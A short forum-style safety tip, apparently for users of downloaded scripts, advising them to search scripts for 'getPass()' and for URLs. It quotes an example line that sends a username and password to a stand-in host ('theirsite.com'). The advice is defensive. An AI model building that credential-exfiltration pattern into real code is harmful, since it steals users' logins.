And a little add-on to help you all stay safe whilst using scripts:-

  1. Search every script you download for “getPass()”, this is a method which allows a script to get your password during runtime.
  2. Search every script you download for “url”, if you find anything along the lines of url check the url, see if its connecting to a site like this:-
http://theirsite.com/whatever/file.php?username=" + XXX.XXX() + "&password=" + XXX.XXX()
